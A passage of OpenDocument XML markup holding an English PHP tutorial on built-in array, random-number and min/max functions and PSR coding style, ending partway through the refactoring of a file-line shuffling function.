      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">0 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">1</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">1 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">2</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">2 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">3</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">3 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">4</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">4 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">5</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">5 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">6</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">6 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">7</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">7 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">8</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">8 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">9</text:span></text:p>
      <text:p text:style-name="P87"><text:s text:c="2"/><text:span text:style-name="T150">9 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">10</text:span></text:p>
      <text:p text:style-name="P89"><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T147">(size=14)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">0 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'a'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">1 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'b'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">2 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'c'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">3 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'d'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">4 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'e'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">5 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'f'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">6 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'g'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">7 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'h'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">8 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'i'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">9 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'j'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">10 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'k'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">11 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'l'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">12 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">string</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T157">'m'</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T148">(length=1)</text:span><text:bookmark-end text:name="__DdeLink__556_1892330286"/></text:p>
      <text:p text:style-name="P53"><text:tab/><text:bookmark-start text:name="__DdeLink__558_1892330286"/>But in PHP you can <text:span text:style-name="T174">easily</text:span> get an array of needed letters in an alphabet <text:s/><text:span text:style-name="T163">sequence with a help of this. You can also set <text:s/>the third parameter step to get an array like 0, 2, 4, 6, 8, 10. You can also instrument with negative values to implement your own flexible algorithm.</text:span><text:bookmark-end text:name="__DdeLink__558_1892330286"/></text:p>
      <text:p text:style-name="P52"><text:soft-page-break/><text:tab/><text:bookmark-start text:name="__DdeLink__560_1892330286"/><text:span text:style-name="T166">Array_walk_recursive can help you to process a multilevel json-array the way you like without writing your own recursive function.</text:span><text:bookmark-end text:name="__DdeLink__560_1892330286"/></text:p>
      <text:p text:style-name="P54"><text:span text:style-name="T165"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__562_1892330286"/><text:span text:style-name="T135">$json </text:span><text:span text:style-name="T146">= [</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T140">'one' </text:span><text:span text:style-name="T168">=&gt; </text:span><text:span text:style-name="T162">1</text:span><text:span text:style-name="T143">,</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T140">'two' </text:span><text:span text:style-name="T168">=&gt; [</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T140">'three' </text:span><text:span text:style-name="T168">=&gt; [</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T140">'four' </text:span><text:span text:style-name="T168">=&gt; </text:span><text:span text:style-name="T162">4</text:span><text:span text:style-name="T143">,</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="12"/></text:span><text:span text:style-name="T140">'five' </text:span><text:span text:style-name="T168">=&gt; [</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="16"/></text:span><text:span text:style-name="T140">'end' </text:span><text:span text:style-name="T168">=&gt; </text:span><text:span text:style-name="T140">'the end'</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T137"><text:s text:c="12"/></text:span><text:span text:style-name="T168">]</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="8"/><text:span text:style-name="T167">]</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/><text:span text:style-name="T167">]</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">]</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">array_walk_recursive(</text:span><text:span text:style-name="T133">$json</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T145">function </text:span><text:span text:style-name="T131">(&amp;</text:span><text:span text:style-name="T133">$value</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T133">$key</text:span><text:span text:style-name="T131">)</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$value </text:span><text:span text:style-name="T168">.= is_numeric(</text:span><text:span text:style-name="T135">$value</text:span><text:span text:style-name="T168">) ? </text:span><text:span text:style-name="T140">" is numeric" </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T140">" is not numeric"</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">})</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T131">print_r(</text:span><text:span text:style-name="T133">$json</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span><text:bookmark-end text:name="__DdeLink__562_1892330286"/></text:p>
      <text:p text:style-name="P74"><text:bookmark-start text:name="__DdeLink__564_1892330286"/>Array</text:p>
      <text:p text:style-name="P73">(</text:p>
      <text:p text:style-name="P70"><text:s text:c="4"/><text:span text:style-name="T150">[one] =&gt; 1 is numeric</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="4"/><text:span text:style-name="T150">[two] =&gt; Array</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="8"/><text:span text:style-name="T150">(</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="12"/><text:span text:style-name="T150">[three] =&gt; Array</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="16"/><text:span text:style-name="T150">(</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="20"/><text:span text:style-name="T150">[four] =&gt; 4 is numeric</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="20"/><text:span text:style-name="T150">[five] =&gt; Array</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="24"/><text:span text:style-name="T150">(</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="28"/><text:span text:style-name="T150">[end] =&gt; the end is not numeric</text:span></text:p>
      <text:p text:style-name="P70"><text:s text:c="24"/><text:span text:style-name="T150">)</text:span></text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P70"><text:s text:c="16"/><text:span text:style-name="T150">)</text:span></text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P70"><text:s text:c="8"/><text:span text:style-name="T150">)</text:span></text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P83">)<text:bookmark-end text:name="__DdeLink__564_1892330286"/></text:p>
      <text:p text:style-name="P55"><text:tab/><text:bookmark-start text:name="__DdeLink__569_1892330286"/>In situation when you need to get a random number <text:span text:style-name="T169">from a range</text:span>, randomly swap elements of an array <text:span text:style-name="T170">or symbols in string</text:span> or to fix your random for a time the next set of functions is your gentlemen's set:<text:bookmark-end text:name="__DdeLink__569_1892330286"/></text:p>
      <text:p text:style-name="P64"><text:bookmark-start text:name="__DdeLink__571_1892330286"/><text:span text:style-name="T131">mt_srand(</text:span><text:span text:style-name="T161">1</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T131">mt_rand(</text:span><text:span text:style-name="T161">1</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">10</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$arr </text:span><text:span text:style-name="T131">= range(</text:span><text:span text:style-name="T161">1</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">5</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">shuffle(</text:span><text:span text:style-name="T133">$arr</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">var_dump(</text:span><text:span text:style-name="T133">$arr</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T131">str_shuffle(</text:span><text:span text:style-name="T137">'This sequence is correct!'</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span><text:bookmark-end text:name="__DdeLink__571_1892330286"/></text:p>
      <text:p text:style-name="P75"><text:bookmark-start text:name="__DdeLink__573_1892330286"/>6</text:p>
      <text:p text:style-name="P89"><text:span text:style-name="T2">array</text:span> <text:span text:style-name="T147">(size=5)</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">0 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">4</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">1 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">2</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">2 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">3</text:span></text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/><text:span text:style-name="T150">3 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">1</text:span></text:p>
      <text:p text:style-name="P87"><text:s text:c="2"/><text:span text:style-name="T150">4 </text:span><text:span text:style-name="T155">=&gt;</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T153">int</text:span><text:span text:style-name="T150"> </text:span><text:span text:style-name="T164">5</text:span></text:p>
      <text:p text:style-name="P83">ouTnqehrrsc esecseii! ct <text:bookmark-end text:name="__DdeLink__573_1892330286"/></text:p>
      <text:p text:style-name="P86"><text:soft-page-break/><text:span text:style-name="T68"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__575_1892330286"/><text:span text:style-name="T69">You can remove the first function in a list to get new random numbers each time you run your program.</text:span><text:bookmark-end text:name="__DdeLink__575_1892330286"/></text:p>
      <text:p text:style-name="P86"><text:span text:style-name="T69"><text:tab/></text:span><text:span text:style-name="T70">Find out the smaller value from two is a usual taks, but PHP also has a function for such things.</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T81">echo </text:span><text:span text:style-name="T72">max(</text:span><text:span text:style-name="T97">10</text:span><text:span text:style-name="T83">, </text:span><text:span text:style-name="T97">20</text:span><text:span text:style-name="T72">)</text:span><text:span text:style-name="T83">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T137">'&lt;br/&gt;'</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T131">min([</text:span><text:span text:style-name="T161">10</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">20</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">30</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">5</text:span><text:span text:style-name="T131">]</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T131">-</text:span><text:span text:style-name="T161">1</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">10</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P84">20</text:p>
      <text:p text:style-name="P83">-1</text:p>
      <text:p text:style-name="P85"><text:tab/>As you can see it“s working not only with a simple couple of numbers.</text:p>
      <text:p text:style-name="P85"><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p>
      <text:p text:style-name="P81"><text:span text:style-name="T98">$mark </text:span><text:span text:style-name="T71">= </text:span><text:span text:style-name="T111">'100'</text:span><text:span text:style-name="T82">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$mark </text:span><text:span text:style-name="T131">= min(</text:span><text:span text:style-name="T133">$mark</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">5</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$mark </text:span><text:span text:style-name="T131">= max(</text:span><text:span text:style-name="T133">$mark</text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T161">1</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P79"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T133">$mark</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P85">5</text:p>
      <text:p text:style-name="P56"><text:tab/><text:span text:style-name="T73">That wasn“t even a tip of the iceberg of PHP high level opportunities. But I think that such demonstratoin of base types data processing is enough to realize that PHP is actually pleasant writing language full of fast built-in solutions.</text:span></text:p>
      <text:p text:style-name="P94"/>
      <text:p text:style-name="P3"><text:span text:style-name="T74">3.</text:span><text:span text:style-name="T67">Writing style</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T67"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1935_379528241"/><text:span text:style-name="T67">Single style of coding is probably the main pillar of perspective company, productive team and successful programmer. PHP is one of few (or even the only one) </text:span><text:span text:style-name="T78">of</text:span><text:span text:style-name="T67"> modern actual languages which has single standar</text:span><text:span text:style-name="T78">d</text:span><text:span text:style-name="T67"> of how to write code on it. It is called PSR and there are some rumors that reading and learning this Bible of any experienced PHP developer not only </text:span><text:span text:style-name="T75">improves the quality of your code and makes your team-mates much more kind and friendly when they are forced to work with your code but increase testosterone and IQ level. Generally this is something that must be read.</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T76"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1937_379528241"/><text:span text:style-name="T77">Ta</text:span><text:bookmark-end text:name="__DdeLink__1935_379528241"/><text:span text:style-name="T77">lking of more abstract ideas than code details and </text:span><text:span text:style-name="T33">specialties the main think I</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T33">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39">'</text:span><text:span text:style-name="T33">s time for </text:span><text:span text:style-name="T34">the expansion</text:span><text:span text:style-name="T33">.</text:span><text:bookmark-end text:name="__DdeLink__1937_379528241"/></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/><text:span text:style-name="T33"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1939_379528241"/><text:bookmark-start text:name="__DdeLink__1943_379528241"/><text:span text:style-name="T40">Lets have a look on the</text:span><text:span text:style-name="T34"> continuation of my idea on the example. We need soft which shake the contents of file: </text:span><text:span text:style-name="T40">interchanges lines</text:span><text:span text:style-name="T34"> </text:span><text:span text:style-name="T35">and informs how much of them were in it.</text:span><text:bookmark-end text:name="__DdeLink__1939_379528241"/><text:bookmark-end text:name="__DdeLink__1943_379528241"/></text:p>
      <text:p text:style-name="P66"><text:bookmark-start text:name="__DdeLink__1941_379528241"/><text:span text:style-name="T91">function </text:span><text:span text:style-name="T119">shuffleFileNewbie</text:span><text:span text:style-name="T35">(</text:span><text:span text:style-name="T101">$filename</text:span><text:span text:style-name="T35">)</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$a</text:span><text:span text:style-name="T131">= file_get_contents(</text:span><text:span text:style-name="T133">$filename</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$b</text:span><text:span text:style-name="T131">= </text:span><text:span text:style-name="T161">0 </text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$l </text:span><text:span text:style-name="T131">=[]</text:span><text:span text:style-name="T141">; </text:span><text:span text:style-name="T176">//lines</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T145">for </text:span><text:span text:style-name="T131">(</text:span><text:span text:style-name="T133">$i </text:span><text:span text:style-name="T131">= </text:span><text:span text:style-name="T161">0</text:span><text:span text:style-name="T141">; </text:span><text:span text:style-name="T133">$i </text:span><text:span text:style-name="T131">&lt; strlen(</text:span><text:span text:style-name="T133">$a</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">; </text:span><text:span text:style-name="T133">$i</text:span><text:span text:style-name="T131">++)</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if</text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T135">$a </text:span><text:span text:style-name="T168">[</text:span><text:span text:style-name="T135">$i</text:span><text:span text:style-name="T168">] != </text:span><text:span text:style-name="T140">"</text:span><text:span text:style-name="T143">\n</text:span><text:span text:style-name="T140">"</text:span><text:span text:style-name="T168">)</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$l </text:span><text:span text:style-name="T168">[</text:span><text:span text:style-name="T135">$b</text:span><text:span text:style-name="T168">] .= </text:span><text:span text:style-name="T135">$a</text:span><text:span text:style-name="T168">[</text:span><text:span text:style-name="T135">$i</text:span><text:span text:style-name="T168">]</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">else </text:span><text:span text:style-name="T135">$b</text:span><text:span text:style-name="T168">++ </text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">var_dump(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$l </text:span><text:span text:style-name="T131">= myOwnShuffle(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T133">$new_l </text:span><text:span text:style-name="T131">= </text:span><text:span text:style-name="T137">""</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T145">for</text:span><text:span text:style-name="T131">(</text:span><text:span text:style-name="T133">$i</text:span><text:span text:style-name="T131">=</text:span><text:span text:style-name="T161">0</text:span><text:span text:style-name="T141">; </text:span><text:span text:style-name="T133">$i </text:span><text:span text:style-name="T131">&lt; count(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T131">) </text:span><text:span text:style-name="T141">; </text:span><text:span text:style-name="T133">$i</text:span><text:span text:style-name="T131">++)</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$new_l </text:span><text:span text:style-name="T168">.= </text:span><text:span text:style-name="T135">$l</text:span><text:span text:style-name="T168">[</text:span><text:span text:style-name="T135">$i</text:span><text:span text:style-name="T168">] . </text:span><text:span text:style-name="T140">"</text:span><text:span text:style-name="T143">\n</text:span><text:span text:style-name="T140">"</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T131">file_put_contents(</text:span><text:span text:style-name="T133">$filename </text:span><text:span text:style-name="T141">, </text:span><text:span text:style-name="T133">$new_l</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T145">echo </text:span><text:span text:style-name="T131">count(</text:span><text:span text:style-name="T133">$l</text:span><text:span text:style-name="T131">)</text:span><text:span text:style-name="T141">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__1941_379528241"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T35"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1945_379528241"/><text:span text:style-name="T35">T</text:span><text:span text:style-name="T31">his code is working. But it is not readable, not safe, not extensible and just ugly without any excuses. To fix the trouble I</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T31">m to follow simple set of rules:</text:span><text:bookmark-end text:name="__DdeLink__1945_379528241"/></text:p>
      <text:list xml:id="list4961309773634162444" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P95"><text:bookmark-start text:name="__DdeLink__1955_379528241"/>Refactor it according the PSR<text:bookmark-end text:name="__DdeLink__1955_379528241"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P96"><text:bookmark-start text:name="__DdeLink__1957_379528241"/><text:span text:style-name="T31">Use built-in short succinct </text:span><text:span text:style-name="T37">and safe</text:span><text:span text:style-name="T31"> </text:span><text:span text:style-name="T36">functions instead of writing my own ones</text:span><text:bookmark-end text:name="__DdeLink__1957_379528241"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P97"><text:bookmark-start text:name="__DdeLink__1959_379528241"/><text:span text:style-name="T31">Name the variables with meaningful long </text:span><text:span text:style-name="T40">enough</text:span><text:span text:style-name="T31"> nouns</text:span><text:bookmark-end text:name="__DdeLink__1959_379528241"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P96"><text:bookmark-start text:name="__DdeLink__1961_379528241"/><text:span text:style-name="T31">Add strict types to make code more sa</text:span><text:span text:style-name="T37">f</text:span><text:span text:style-name="T31">e and protect from </text:span><text:span text:style-name="T37">unexpected</text:span><text:span text:style-name="T31"> variables</text:span><text:bookmark-end text:name="__DdeLink__1961_379528241"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P67"><text:bookmark-start text:name="__DdeLink__1947_379528241"/><text:span text:style-name="T90">function </text:span><text:span text:style-name="T118">shuffleFileAmateur</text:span><text:span text:style-name="T31">(string </text:span><text:span text:style-name="T100">$filename</text:span><text:span text:style-name="T31">): int</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$lines </text:span><text:span text:style-name="T168">= file(</text:span><text:span text:style-name="T135">$filename</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T168">shuffle(</text:span><text:span text:style-name="T135">$lines</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
